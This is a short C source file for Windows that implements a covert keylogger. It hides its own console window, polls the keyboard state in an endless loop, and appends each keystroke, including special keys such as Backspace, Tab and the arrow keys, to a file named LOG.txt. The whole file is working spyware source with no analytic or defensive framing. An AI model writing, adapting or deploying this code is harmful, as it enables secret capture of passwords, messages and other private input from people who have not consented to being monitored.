#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

void stealth();  // Function to hide the console
int save(int keystroke, char *file);  // Function to log keystrokes

int main() {
    stealth();  // Hide the console window

    while (1) {
        // Loop through key codes (0 to 190)
        for (int i = 0; i < 191; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                save(i, "LOG.txt");  // Save keypress to log file
            }
        }
    }

    return 0;
}

void stealth() {
    HWND stealth;
    AllocConsole();  // Allocate a console for the app (you may want to remove this if running in console mode)
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);  // Hide the window
}

int save(int key_stroke, char *file) {
    if (key_stroke == 1 || key_stroke == 2) return 0;  // Ignore mouse clicks

    FILE *outputFile;
    outputFile = fopen(file, "a+");

    if (outputFile == NULL) {
        return 1;  // Return error if the file cannot be opened
    }

    switch (key_stroke) {
        case 8: fprintf(outputFile, "[BACKSPACE]"); break;
        case 13: fprintf(outputFile, "\n"); break;
        case 32: fprintf(outputFile, " "); break;
        case VK_TAB: fprintf(outputFile, "[TAB]"); break;
        case VK_SHIFT: fprintf(outputFile, "[SHIFT]"); break;
        case VK_CONTROL: fprintf(outputFile, "[CONTROL]"); break;
        case VK_ESCAPE: fprintf(outputFile, "[ESCAPE]"); break;
        case VK_END: fprintf(outputFile, "[END]"); break;
        case VK_HOME: fprintf(outputFile, "[HOME]"); break;
        case VK_LEFT: fprintf(outputFile, "[LEFT]"); break;
        case VK_UP: fprintf(outputFile, "[UP]"); break;
        case VK_RIGHT: fprintf(outputFile, "[RIGHT]"); break;
        case VK_DOWN: fprintf(outputFile, "[DOWN]"); break;
        case 190: case 110: fprintf(outputFile, "."); break;  // Handle period key
        default:
            // Log any other key (printable characters)
            if (key_stroke >= 32 && key_stroke <= 126) {
                fprintf(outputFile, "%c", key_stroke);
            } else {
                fprintf(outputFile, "[%d]", key_stroke);  // Log unknown keys by their keycode
            }
            break;
    }

    fclose(outputFile);  // Close the file after writing

    return 0;
}
